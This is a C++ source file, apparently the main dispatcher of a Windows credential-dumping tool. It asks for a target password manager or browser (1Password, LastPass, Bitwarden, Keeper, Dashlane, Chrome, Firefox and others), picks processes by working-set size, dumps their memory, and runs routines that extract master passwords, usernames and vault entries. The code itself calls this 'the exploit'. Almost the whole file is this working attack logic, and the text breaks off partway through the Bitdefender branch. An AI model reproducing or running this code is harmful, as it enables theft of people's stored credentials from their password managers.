#pragma once
#include "../core/FindFirstPID.h"
#include "../core/FindSecondPID.h"
#include "../core/FindThirdPID.h"
#include "../core/FindFourthPID.h"
#include "../core/FindSimpleProcPID.h"
#include "../core/saveDump.h"
#include "../core/checkApps.h"
#include "../core/GetProcessListByName.h"
#include "../core/mergeFiles.h"
#include "../core/createFileFromMultiPIDs.h"
#include "../core/findPlugin.h"
#include "../core/assistUser.h"
#include "../firefox/getCredsfirefox.h"
#include "../firefox/getCredsfirefox2.h"
#include "../chromium/getCredschromium.h"
#include "../1password/app/getCreds1passwordappMaster.h"
#include "../1password/app/getCreds1passwordappEntries1.h"
#include "../1password/app/getCreds1passwordappEntries2.h"
#include "../1password/app/getProcUAC1password.h"
#include "../1password/app/FindsecondPID1password.h"
#include "../1password/plugin/getCreds1passwordplugin.h"
#include "../1password/plugin/getCreds1passwordplugin2.h"
#include "../keeper/getCredskeeper1.h"
#include "../keeper/getCredskeeper2.h"
#include "../keeper/getCredskeeper3.h"
#include "../dashlane/getCredsdashlaneEntries.h"
#include "../dashlane/getCredsdashlaneMaster.h"
#include "../lastpass/getCredslastpassEntries.h"
#include "../lastpass/getCredslastpassMasterPass.h"
#include "../lastpass/getCredslastpassMasterUsername.h"
#include "../roboform/getCredsroboform.h"
#include "../bitwarden/plugin/getCredsbitwardenPluginChrome.h"
#include "../bitwarden/plugin/getCredsbitwardenPluginChrome2.h"
#include "../norton/getCredsnorton.h"
#include "../norton/getCredsnorton2.h"
#include "../bitdefender/getCredsbitdefender.h"
#include "../bitdefender/getCredsbitdefender2.h"
#include "../ironvest/getCredsironvest.h"
#include "../passwarden/app/getCredspasswarden.h"
#include "../passwarden/app/getCredspasswarden2.h"
#include "../avira/getCredsavira.h"
#include "../avira/getCredsavira2.h"
#include "../passwordboss/app/getCredspasswordbossapp1.h"
#include "../passwordboss/app/getCredspasswordbossapp2.h"


int checkApps() {
    std::cout << "Choose one mode (full, fast, local): ";
    std::string mode;
    std::cin >> mode;

    std::string merge;
    std::string userInput;
    std::string fileInput;

    std::cout << "Do you want to check which apps/plugins are installed (yes, no): ";
    std::string checkPaths;
    std::cin >> checkPaths;

    if (checkPaths == "yes") {
        //Check for Keeper
        if (DirectoryContainsKeeperSecurityInc())
        {
            std::wcout << L"A folder containing 'KeeperSecurityInc' in its name exists in the Local AppData directory.\n" << std::endl;
        }
        else
        {
            std::wcout << L"No folder containing 'KeeperSecurityInc' in its name found in the Local AppData directory.\n" << std::endl;
        }
        //Other apps
        assistUser();
    }

    std::cout << "Enter the name of the password manager (accepted values, 1password, avira, \n";
    std::cout << "bitdefender, bitwarden, brave, chrome, dashlane, firefox, ironvest, keeper,\n";
    std::cout << "lastpass, msedge, norton, passwarden, passwordboss, roboform ): ";
    std::cin >> userInput;
    
    wchar_t currentDir[MAX_PATH];

    if (mode == "local") {
        std::cout << "Include the dump file(s) in the same directory with this .exe.\n";
        std::cout << "Do you want to merge files (yes, no)?: ";
        std::cin >> merge;

        if (merge == "no") {
            std::cout << "Provide the dump file name as an input (e.g., app.dmp): ";
            std::cin >> fileInput;
        }

        if (merge == "yes") {
            mergeFiles();
            fileInput = "app.dmp";
        }
       
    }


    //firefox
    if (userInput == "firefox") {
        std::cout << "User input matches 'firefox'.\n";
        std::cout << "Ensure that Firefox did communicate with the embedded password manager.\n";
        std::cout << "Note that the exploit does not always work correctly. \n";
        std::cout << "This means that credentials will exist within the memory, but they will not be found.\n";
        const char* processName = "firefox.exe";
        std::vector<DWORD> pids;

        if (mode == "fast") {
            // Step 1: Find PIDs by process name
            pids = FindPIDsByProcessName(processName);

            if (!pids.empty())
            {
                // Step 2: Get Private Working Set sizes for the found PIDs
                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                // Step 3: Find the PID with the second-largest Private Working Set size
                DWORD secondLargestPID = FindSecondPID(pidSizePairs);

                if (secondLargestPID != 0)
                {
                    // Step 4: Create a dump file for the process with the second-largest size
                    saveDump(secondLargestPID);
                }
                else
                {
                    std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
                }
            }
            else
            {
                std::cerr << "No processes with the specified name found." << std::endl;
            }
            fileInput = "app.dmp";
        }

        if (mode == "full") {
 
             pids = FindPIDsByProcessName(processName);

            for (DWORD pid : pids) {
                std::wcout << L"Process PID: " << pid << std::endl;
                createFileFromMultiPIDs(pid);
            }

            fileInput = "app.dmp";
        }

        std::cout << "Searching for entries (1/2).\n";
        getCredsfirefox(fileInput);
        std::cout << "Searching for entries (2/2).\n";
        getCredsfirefox2(fileInput);
        std::cout << "Done!\n";
        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
    }

    //chromium
    if (userInput == "chrome" || userInput == "msedge" || userInput == "brave") {
        std::cout << "User input matches chromium-based browser.\n";
        std::cout << "Ensure that Chromium browser did communicate with the embedded password manager.\n";
        const char* processName = 0;
        std::vector<DWORD> pids;

        if (userInput == "chrome") {

            if (mode == "fast") {
                processName = "chrome.exe";
                // Step 1: Find PIDs by process name
               pids = FindPIDsByProcessName(processName);

                if (!pids.empty())
                {
                    // Step 2: Get Private Working Set sizes for the found PIDs
                    std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                    // Step 3: Find the PID with the second-largest Private Working Set size
                    DWORD secondLargestPID = FindSecondPID(pidSizePairs);

                    if (secondLargestPID != 0)
                    {
                        // Step 4: Create a dump file for the process with the second-largest size
                        saveDump(secondLargestPID);
                    }
                    else
                    {
                        std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
                    }
                }
                else
                {
                    std::cerr << "No processes with the specified name found." << std::endl;
                }
                fileInput = "app.dmp";
            }

            if (mode == "full") {
                pids = FindPIDsByProcessName(processName);

                for (DWORD pid : pids) {
                    std::wcout << L"Process PID: " << pid << std::endl;
                    createFileFromMultiPIDs(pid);
                }

                fileInput = "app.dmp";
            }
            std::cout << "Searching for entries.\n";
            getCredschromium(fileInput);
            std::cout << "Done!\n";
            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
        }
        else if (userInput == "msedge") {
            processName = "msedge.exe";
            processName = "chrome.exe";
            // Step 1: Find PIDs by process name
            pids = FindPIDsByProcessName(processName);

            if (mode == "fast") {
                if (!pids.empty())
                {
                    // Step 2: Get Private Working Set sizes for the found PIDs
                    std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                    // Step 3: Find the PID with the second-largest Private Working Set size
                    DWORD secondLargestPID = FindSecondPID(pidSizePairs);

                    if (secondLargestPID != 0)
                    {
                        // Step 4: Create a dump file for the process with the second-largest size
                        saveDump(secondLargestPID);
                    }
                    else
                    {
                        std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
                    }
                }
                else
                {
                    std::cerr << "No processes with the specified name found." << std::endl;
                }
                fileInput = "app.dmp";
            }

            if (mode == "full") {
                pids = FindPIDsByProcessName(processName);

                for (DWORD pid : pids) {
                    std::wcout << L"Process PID: " << pid << std::endl;
                    createFileFromMultiPIDs(pid);
                }

                fileInput = "app.dmp";
            }

            std::cout << "Searching for entries.\n";
            getCredschromium(fileInput);
            std::cout << "Done!\n";
            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";

        }
        else if (userInput == "brave") {
            processName = "brave.exe";
            // Step 1: Find PIDs by process name
            pids = FindPIDsByProcessName(processName);

            if (mode == "fast") {
                if (!pids.empty())
                {
                    // Step 2: Get Private Working Set sizes for the found PIDs
                    std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                    // Step 3: Find the PID with the first-largest Private Working Set size
                    DWORD firstLargestPID = FindFirstPID(pidSizePairs);

                    if (firstLargestPID != 0)
                    {
                        // Step 4: Create a dump file for the process with the first-largest size
                        saveDump(firstLargestPID);
                    }
                    else
                    {
                        std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
                    }
                }
                else
                {
                    std::cerr << "No processes with the specified name found." << std::endl;
                }
                fileInput = "app.dmp";
            }

            if (mode == "full") {
                pids = FindPIDsByProcessName(processName);

                for (DWORD pid : pids) {
                    std::wcout << L"Process PID: " << pid << std::endl;
                    createFileFromMultiPIDs(pid);
                }

                fileInput = "app.dmp";
            }

            std::cout << "Searching for entries.\n";
            getCredschromium(fileInput);
            std::cout << "Done!\n";
            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
        }
    }

    //keeper
    if (userInput == "keeper") {
        std::cout << "User input matches 'keeper'.\n";
        std::cout << "In this app, the third largest process is needed.\n";
        std::cout << "Only entries should be available.\n";
        std::cout << "Also, by default the app does not encrypt the vault after locking the UI due to inactivity.\n";
        const char* processName = "keeperpasswordmanager.exe";
        std::vector<DWORD> pids;

        if (mode == "fast") {
            // Step 1: Find PIDs by process name
            pids = FindPIDsByProcessName(processName);

            if (!pids.empty())
            {
                // Step 2: Get Private Working Set sizes for the found PIDs
                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                // Step 3: Find the PID with the third-largest Private Working Set size
                DWORD thirdLargestPID = FindThirdPID(pidSizePairs);

                if (thirdLargestPID != 0)
                {
                    // Step 4: Create a dump file for the process with the third-largest size
                    saveDump(thirdLargestPID);
                }
                else
                {
                    std::cerr << "No process with the third-largest Private Working Set size found." << std::endl;
                }
            }
            else
            {
                std::cerr << "No processes with the specified name found." << std::endl;
            }
            fileInput = "app.dmp";
        }

        if (mode == "full") {
            pids = FindPIDsByProcessName(processName);

            for (DWORD pid : pids) {
                std::wcout << L"Process PID: " << pid << std::endl;
                createFileFromMultiPIDs(pid);
            }

            fileInput = "app.dmp";
        }

        std::cout << "Searching for entries (1/3).\n";
        getCredskeeper1(fileInput);
        std::cout << "Done!\n";
        std::cout << "Searching for master username (2/3).\n";
        getCredskeeper2(fileInput);
        std::cout << "Done!\n";
        std::cout << "Searching for master password (3/3).\n";
        getCredskeeper3(fileInput);
        std::cout << "Done!\n";
        std::cout << "If zero credentials were found, ensure that the app is up and running!\n";
    }

    //passwarden
    //not checked Firefox and Chrome
    if (userInput == "passwarden") {
        std::cout << "User input matches 'passwarden'.\n";
        std::cout << "Only entries should be available.\n";
        std::cout << "Fast and Full are the same for this app.\n";
        const char* processName = "Passwarden.App.exe";

        // Step 1: Find PIDs by process name
        DWORD pid = FindSimpleProcPID(processName);

        if (pid != 0)
        {
            // Step 2: Create a dump file for the process with the second-largest size
            saveDump(pid);
        }
        else
        {
            std::cerr << "No process with this PID found." << std::endl;
        }

        if (mode == "fast" || mode == "full") {
            fileInput = "app.dmp";
        }

        std::cout << "Searching for entries (1/2).\n";
        getCredspasswarden(fileInput);
        std::cout << "Done!\n";
        std::cout << "Searching for master username (2/2).\n";
        getCredspasswarden2(fileInput);
        std::cout << "Done!\n";
        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
    }

    //passwordboss
    //not checked Firefox and Chrome
    if (userInput == "passwordboss") {
        std::cout << "User input matches 'passwordboss'.\n";
        std::cout << "Only entries should be available.\n";
        std::cout << "Fast and Full are the same for this app.\n";
        const char* processName = "PasswordBoss.exe";

        // Step 1: Find PIDs by process name
        DWORD pid = FindSimpleProcPID(processName);


        if (pid != 0)
        {
            // Step 2: Create a dump file for the process with the second-largest size
            saveDump(pid);
        }
        else
        {
            std::cerr << "No process with this PID found." << std::endl;
        }

        if (mode == "fast" || mode == "full") {
            fileInput = "app.dmp";
        }

        std::cout << "Searching for entries (1/2).\n";
        getCredspasswordbossapp1(fileInput);
        std::cout << "Done!\n";
        std::cout << "Searching for entries (2/2).\n";
        getCredspasswordbossapp2(fileInput);
        std::cout << "Done!\n";
        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
    }

    //1password app
    std::string userInput2;
    if (userInput == "1password") {
        std::cout << "Enter 0 if it is 1Password browser plugin, otherwise enter 1 (app): ";
        std::cin >> userInput2;

        if (userInput2 == "1") {
            std::cout << "User input matches '1password' app.\n";
            std::cout << "Fast and Full are the same for this app.\n";
            std::cout << "1Password contains all relevant credentials (master pass, username, entries, etc.).\n";
            std::cout << "'1Password' needs High Integrity Privileges to dump the relevant process!\n";

            if (mode == "local") {
                std::cout << "Searching for entries (1/2).\n";
                getCreds1passwordappEntries1(fileInput);
                std::cout << "Done!\n";
                std::cout << "Searching for entries (2/2).\n";
                getCreds1passwordappEntries2(fileInput);
                std::cout << "Done!\n";
                std::cout << "Searching for master credentials.\n";
                getCreds1passwordappMaster(fileInput);
                std::cout << "Done!\n";
            }
            else if (mode == "fast" || mode == "full") {
                std::cout << "User input was for 1Password.\n";
                std::cout << "Assume that we have high integrity privileges.\n";
                fileInput = "app.dmp";
                // Step 1: Find PIDs of 1Password
                string pid = FindsecondPID1password();
                if (pid != "")
                {
                    // Step 2: Create a dump file for the process with the second-largest size (Powershell assist)
                    // File creation is a bit messy, but the process was not being dumped with another way
                    getProcUAC1password(pid);
                    std::cout << "Searching for entries (1/2).\n";
                    getCreds1passwordappEntries1(fileInput);
                    std::cout << "Done!\n";
                    std::cout << "Searching for entries (2/2).\n";
                    getCreds1passwordappEntries2(fileInput);
                    std::cout << "Done!\n";
                    std::cout << "Searching for master pass.\n";
                    getCreds1passwordappMaster(fileInput);
                    std::cout << "Done!\n";
                }
                else
                {
                    std::cerr << "No process with the third-largest Private Working Set size found." << std::endl;
                }
            }
            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
        }

        //1password browser plugin
        if (userInput == "1password" && userInput2 == "0") {
            std::cout << "User input matches '1Password' browser plugin.\n";
            std::cout << "1Password browser plugin only contains master password and the account email (username) of the user.\n";
            std::cout << "Regardless of the browser, the largest in size process must be found.\n";

            wchar_t username[256];
            DWORD usernameSize = sizeof(username) / sizeof(username[0]);

            if (GetUserNameW(username, &usernameSize)) {
                // Replace this value with the extension name you want to check
                std::wstring extensionName = L"aeblfdkhhhdcdjpifhhbdiojplfjncoa";

                if (findPlugin(username, extensionName)) {
                    std::wcout << L"Directory exists!" << std::endl;
                }
                else {
                    std::wcout << L"Directory does not exist." << std::endl;
                    std::wcout << L"Stop execution.\n" << std::endl;
                    return 1;
                }
            }
            else {
                std::wcerr << L"Failed to get the current user's login name." << std::endl;
                return 1;
            }

         
            std::cout << "Provide the browser (e.g., firefox, chrome): ";
            std::string browserInput;
            std::cin >> browserInput;

            if (browserInput == "firefox") {
                const char* processName = "firefox.exe";
                std::cout << "User input was for Firefox.\n";
                // Step 1: Find PIDs by process name
                std::vector<DWORD> pids;

                if (mode == "fast") {
                    pids = FindPIDsByProcessName(processName);

                    if (!pids.empty())
                    {
                        // Step 2: Get Private Working Set sizes for the found PIDs
                        std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                        // Step 3: Find the PID with the first-largest Private Working Set size
                        DWORD firstLargestPID = FindFirstPID(pidSizePairs);

                        if (firstLargestPID != 0)
                        {
                            // Step 4: Create a dump file for the process with the first-largest size
                            saveDump(firstLargestPID);
                        }
                        else
                        {
                            std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
                        }
                    }
                    else
                    {
                        std::cerr << "No processes with the specified name found." << std::endl;
                    }
                    fileInput = "app.dmp";
                }

                if (mode == "full") {
                    pids = FindPIDsByProcessName(processName);

                    for (DWORD pid : pids) {
                        std::wcout << L"Process PID: " << pid << std::endl;
                        createFileFromMultiPIDs(pid);
                    }

                    fileInput = "app.dmp";
                }

                std::cout << "Searching for master credentials.\n";
                getCreds1passwordplugin(fileInput);
                std::cout << "Done!\n";
                std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
            }
            else if (browserInput == "chrome") {
                const char* processName = "chrome.exe";
                std::cout << "User input was for Chrome.\n";

                // Step 1: Find PIDs by process name
                std::vector<DWORD> pids;

                if (mode == "fast") {
                    pids = FindPIDsByProcessName(processName);
                    if (!pids.empty())
                    {
                        // Step 2: Get Private Working Set sizes for the found PIDs
                        std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                        // Step 3: Find the PID with the first-largest Private Working Set size
                        DWORD firstLargestPID = FindFirstPID(pidSizePairs);

                        if (firstLargestPID != 0)
                        {
                            // Step 4: Create a dump file for the process with the first-largest size
                            saveDump(firstLargestPID);
                        }
                        else
                        {
                            std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
                        }
                    }
                    else
                    {
                        std::cerr << "No processes with the specified name found." << std::endl;
                    }
                    fileInput = "app.dmp";
                }

                if (mode == "full") {
                    pids = FindPIDsByProcessName(processName);

                    for (DWORD pid : pids) {
                        std::wcout << L"Process PID: " << pid << std::endl;
                        createFileFromMultiPIDs(pid);
                    }

                    fileInput = "app.dmp";
                }

                std::cout << "Searching for master credentials (1/2).\n";
                getCreds1passwordplugin(fileInput);
                std::cout << "Done!\n";
                std::cout << "Searching for master credentials (2/2).\n";
                getCreds1passwordplugin2(fileInput);
                std::cout << "Done!\n";
                std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
            }
            else {
                std::cout << "Wrong browser, provide either firefox or chrome\n";
            }
        }
    }


    //dashlane
    if (userInput == "dashlane") {
        std::cout << "User input matches 'dashlane'.\n";
        std::cout << "After communicating with the browser plugin, wait for 1 min to retrieve entries.\n";
        std::cout << "Master username and password will be immediatelly available.\n";
        std::cout << "In this browser plugin, the first largest process is needed.\n";
        std::cout << "All credentials should be available (master pass, entries, etc).\n";
        std::cout << "Provide the browser (e.g., firefox, chrome): ";
        std::string browserInput;
        std::cin >> browserInput;
        const char* processName = 0;

        wchar_t username[256];
        DWORD usernameSize = sizeof(username) / sizeof(username[0]);

        if (GetUserNameW(username, &usernameSize)) {
            // Replace this value with the extension name you want to check
            std::wstring extensionName = L"fdjamakpfbbddfjaooikfcpapjohcfmg";

            if (findPlugin(username, extensionName)) {
                std::wcout << L"Directory exists!" << std::endl;
            }
            else {
                std::wcout << L"Directory does not exist." << std::endl;
                std::wcout << L"Stop execution.\n" << std::endl;
                return 1;
            }
        }
        else {
            std::wcerr << L"Failed to get the current user's login name." << std::endl;
            return 1;
        }


        if (browserInput == "chrome") {
            processName = "chrome.exe";
        }
        else if (browserInput == "firefox") {
            processName = "firefox.exe";
        }

        // Step 1: Find PIDs by process name
        std::vector<DWORD> pids;

        if (mode == "fast") {

            pids = FindPIDsByProcessName(processName);

            if (!pids.empty())
            {
                // Step 2: Get Private Working Set sizes for the found PIDs
                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                // Step 3: Find the PID with the first-largest Private Working Set size
                DWORD firstLargestPID = FindFirstPID(pidSizePairs);

                if (firstLargestPID != 0)
                {
                    // Step 4: Create a dump file for the process with the first-largest size
                    saveDump(firstLargestPID);
                }
                else
                {
                    std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
                }
            }
            else
            {
                std::cerr << "No processes with the specified name found." << std::endl;
            }
            fileInput = "app.dmp";
        }

        if (mode == "full") {
            pids = FindPIDsByProcessName(processName);

            for (DWORD pid : pids) {
                std::wcout << L"Process PID: " << pid << std::endl;
                createFileFromMultiPIDs(pid);
            }

            fileInput = "app.dmp";
        }

        std::cout << "Searching for entries.\n";
        getCredsdashlaneEntries(fileInput);
        std::cout << "Done!\n";
        std::cout << "Searching for master username and password.\n";
        getCredsdashlaneMaster(fileInput);
        std::cout << "Done!\n";
        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
    }

    //lastpass
    if (userInput == "lastpass") {
        std::cout << "User input matches 'lastpass'.\n";
        std::cout << "In this browser plugin, the first largest process is needed.\n";
        std::cout << "All credentials should be available (master username, entries, etc).\n";
        std::cout << "To find the master password, the user should enter it to log-in and did not terminate the browser\n";
        std::cout << "In most cases, the user will be already logged-in.\n";
        std::cout << "For now, this only works with Chrome.\n";
        const char* processName = "chrome.exe";

        wchar_t username[256];
        DWORD usernameSize = sizeof(username) / sizeof(username[0]);

        if (GetUserNameW(username, &usernameSize)) {
            // Replace this value with the extension name you want to check
            std::wstring extensionName = L"hdokiejnpimakedhajhdlcegeplioahd";

            if (findPlugin(username, extensionName)) {
                std::wcout << L"Directory exists!" << std::endl;
            }
            else {
                std::wcout << L"Directory does not exist." << std::endl;
                std::wcout << L"Stop execution.\n" << std::endl;
                return 1;
            }
        }
        else {
            std::wcerr << L"Failed to get the current user's login name." << std::endl;
            return 1;
        }


        // Step 1: Find PIDs by process name
        std::vector<DWORD> pids;

        if (mode == "fast") {

            pids = FindPIDsByProcessName(processName);

            if (!pids.empty())
            {
                // Step 2: Get Private Working Set sizes for the found PIDs
                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                // Step 3: Find the PID with the firstLargestPID-largest Private Working Set size
                DWORD firstLargestPID = FindFirstPID(pidSizePairs);

                if (firstLargestPID != 0)
                {
                    // Step 4: Create a dump file for the process with the firstLargestPID-largest size
                    saveDump(firstLargestPID);
                }
                else
                {
                    std::cerr << "No process with the firstLargestPID-largest Private Working Set size found." << std::endl;
                }
            }
            else
            {
                std::cerr << "No processes with the specified name found." << std::endl;
            }
            fileInput = "app.dmp";
        }

        if (mode == "full") {
            pids = FindPIDsByProcessName(processName);

            for (DWORD pid : pids) {
                std::wcout << L"Process PID: " << pid << std::endl;
                createFileFromMultiPIDs(pid);
            }

            fileInput = "app.dmp";
        }

        std::cout << "Searching for master username.\n";
        getCredslastpassMasterUsername(fileInput);
        std::cout << "Done!\n";
        std::cout << "Searching for master password.\n";
        getCredslastpassMasterPass(fileInput);
        std::cout << "Done!\n";
        std::cout << "Searching for entries.\n";
        getCredslastpassEntries(fileInput);
        std::cout << "Done!\n";
        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
    }

    //roboform
    if (userInput == "roboform") {
        std::cout << "User input matches 'roboform'.\n";
        std::cout << "In this browser plugin, the first largest process is needed.\n";
        std::cout << "Only entries should be available.\n";
        std::cout << "For now, this only works with Chrome.\n";
        const char* processName = "chrome.exe";

        wchar_t username[256];
        DWORD usernameSize = sizeof(username) / sizeof(username[0]);

        if (GetUserNameW(username, &usernameSize)) {
            // Replace this value with the extension name you want to check
            std::wstring extensionName = L"pnlccmojcmeohlpggmfnbbiapkmbliob";

            if (findPlugin(username, extensionName)) {
                std::wcout << L"Directory exists!" << std::endl;
            }
            else {
                std::wcout << L"Directory does not exist." << std::endl;
                std::wcout << L"Stop execution.\n" << std::endl;
                return 1;
            }
        }
        else {
            std::wcerr << L"Failed to get the current user's login name." << std::endl;
            return 1;
        }

        // Step 1: Find PIDs by process name
        std::vector<DWORD> pids;

        if (mode == "fast") {

            pids = FindPIDsByProcessName(processName);

            if (!pids.empty())
            {
                // Step 2: Get Private Working Set sizes for the found PIDs
                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                // Step 3: Find the PID with the first-largest Private Working Set size
                DWORD firstLargestPID = FindFirstPID(pidSizePairs);

                if (firstLargestPID != 0)
                {
                    // Step 4: Create a dump file for the process with the first-largest size
                    saveDump(firstLargestPID);
                }
                else
                {
                    std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
                }
            }
            else
            {
                std::cerr << "No processes with the specified name found." << std::endl;
            }
            fileInput = "app.dmp";
        }

        if (mode == "full") {
            pids = FindPIDsByProcessName(processName);

            for (DWORD pid : pids) {
                std::wcout << L"Process PID: " << pid << std::endl;
                createFileFromMultiPIDs(pid);
            }

            fileInput = "app.dmp";
        }

        std::cout << "Searching for entries.\n";
        getCredsroboform(fileInput);
        std::cout << "Done!\n";
        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
    }

    //bitwarden
    if (userInput == "bitwarden") {
        std::cout << "User input matches 'bitwarden'.\n";
        std::cout << "In this browser plugin, for Chrome the second largest process is needed.\n";
        std::cout << "For Firefox the third largest process is needed.\n";
        std::cout << "In Firefox, all credentials should be available (master pass, entries, etc).\n";
        std::cout << "In Chrome, only entries are available.\n";
        std::cout << "Note that in case of Chrome, credentials are removed after some time (i.e., 10 min).\n";
        std::cout << "To gain again access to entries in Chrome, a browser interaction with the plugin must be made.\n";
        std::cout << "For instance, this can happen when the user visits any login screen.\n";
        std::cout << "For now, this only works with Chrome.\n";
        const char* processName = "chrome.exe";

        wchar_t username[256];
        DWORD usernameSize = sizeof(username) / sizeof(username[0]);

        if (GetUserNameW(username, &usernameSize)) {
            // Replace this value with the extension name you want to check
            std::wstring extensionName = L"nngceckbapebfimnlniiiahkandclblb";

            if (findPlugin(username, extensionName)) {
                std::wcout << L"Directory exists!" << std::endl;
            }
            else {
                std::wcout << L"Directory does not exist." << std::endl;
                std::wcout << L"Stop execution.\n" << std::endl;
                return 1;
            }
        }
        else {
            std::wcerr << L"Failed to get the current user's login name." << std::endl;
            return 1;
        }

        
        // Step 1: Find PIDs by process name
        std::vector<DWORD> pids;

        if (mode == "fast") {

            pids = FindPIDsByProcessName(processName);

            if (!pids.empty())
            {
                // Step 2: Get Private Working Set sizes for the found PIDs
                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                // Step 3: Find the PID with the second-largest Private Working Set size
                DWORD secondLargestPID = FindSecondPID(pidSizePairs);

                if (secondLargestPID != 0)
                {
                    // Step 4: Create a dump file for the process with the second-largest size
                    saveDump(secondLargestPID);
                }
                else
                {
                    std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
                }
            }
            else
            {
                std::cerr << "No processes with the specified name found." << std::endl;
            }
            fileInput = "app.dmp";
        }

        if (mode == "full") {
            pids = FindPIDsByProcessName(processName);

            for (DWORD pid : pids) {
                std::wcout << L"Process PID: " << pid << std::endl;
                createFileFromMultiPIDs(pid);
            }

            fileInput = "app.dmp";
        }

        std::cout << "Searching for entries (1/2).\n";
        getCredsbitwardenPluginChrome(fileInput);
        std::cout << "Done!\n";
        std::cout << "Searching for entries (2/2).\n";
        getCredsbitwardenPluginChrome2(fileInput);
        std::cout << "Done!\n";
        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
    }


    //norton plugin chrome
    //only browser plugin is available
    //Did not check with Firefox
    if (userInput == "norton") {
        std::cout << "User input matches 'norton'.\n";
        std::cout << "In this browser plugin, the first largest process is needed.\n";
        std::cout << "This works by simply having the browser open. No interaction is needed.\n";
        std::cout << "Only entries should be available.\n";
        std::cout << "Wait 30 sec after starting the browser to execute the tool.\n";
        std::cout << "For now, this only works with Chrome.\n";
        const char* processName = "chrome.exe";

        wchar_t username[256];
        DWORD usernameSize = sizeof(username) / sizeof(username[0]);

        if (GetUserNameW(username, &usernameSize)) {
            // Replace this value with the extension name you want to check
            std::wstring extensionName = L"admmjipmmciaobhojoghlmleefbicajg";

            if (findPlugin(username, extensionName)) {
                std::wcout << L"Directory exists!" << std::endl;
            }
            else {
                std::wcout << L"Directory does not exist." << std::endl;
                std::wcout << L"Stop execution.\n" << std::endl;
                return 1;
            }
        }
        else {
            std::wcerr << L"Failed to get the current user's login name." << std::endl;
            return 1;
        }


        // Step 1: Find PIDs by process name
        std::vector<DWORD> pids;

        if (mode == "fast") {

            pids = FindPIDsByProcessName(processName);

            if (!pids.empty())
            {
                // Step 2: Get Private Working Set sizes for the found PIDs
                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                // Step 3: Find the PID with the first-largest Private Working Set size
                DWORD firstLargestPID = FindFirstPID(pidSizePairs);

                if (firstLargestPID != 0)
                {
                    // Step 4: Create a dump file for the process with the first-largest size
                    saveDump(firstLargestPID);
                }
                else
                {
                    std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
                }
                fileInput = "app.dmp";
            }
            else
            {
                std::cerr << "No processes with the specified name found." << std::endl;
            }

            fileInput = "app.dmp";
            std::cout << "Searching for entries (1/2).\n";
            getCredsnorton(fileInput);
            std::cout << "Done!\n";

            // Step 1: Find PIDs by process name
            pids = FindPIDsByProcessName(processName);

            if (!pids.empty())
            {
                // Step 2: Get Private Working Set sizes for the found PIDs
                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);

                // Step 3: Find the PID with the second-largest Private Working Set size
                DWORD secondLargestPID = FindSecondPID(pidSizePairs);

                if (secondLargestPID != 0)
                {
                    // Step 4: Create a dump file for the process with the second-largest size
                    saveDump(secondLargestPID);
                }
                else
                {
                    std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
                }
                fileInput = "app.dmp";
            }
            else
            {
                std::cerr << "No processes with the specified name found." << std::endl;
            }

            std::cout << "Searching for passwords (master and entries 2/2).\n";
            getCredsnorton2(fileInput);
            std::cout << "Done!\n";
            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
        }


        if (mode == "full") {
            pids = FindPIDsByProcessName(processName);

            for (DWORD pid : pids) {
                std::wcout << L"Process PID: " << pid << std::endl;
                createFileFromMultiPIDs(pid);
            }

            fileInput = "app.dmp";
            std::cout << "Searching for entries (1/2).\n";
            getCredsnorton(fileInput);
            std::cout << "Done!\n";

            std::cout << "Searching for passwords (master and entries 2/2).\n";
            getCredsnorton2(fileInput);
            std::cout << "Done!\n";
            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
        }

        if (mode == "local") {
            
            std::cout << "Searching for entries (1/2).\n";
            getCredsnorton(fileInput);
            std::cout << "Done!\n";

            std::cout << "Searching for passwords (master and entries 2/2).\n";
            getCredsnorton2(fileInput);
            std::cout << "Done!\n";
            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
        }

    }

    //bitdefender plugin chrome
    //only browser plugin is available
    //Did not check with Firefox
    if (userInput == "bitdefender") {
        std::cout << "User input matches 'bitdefender'.\n";
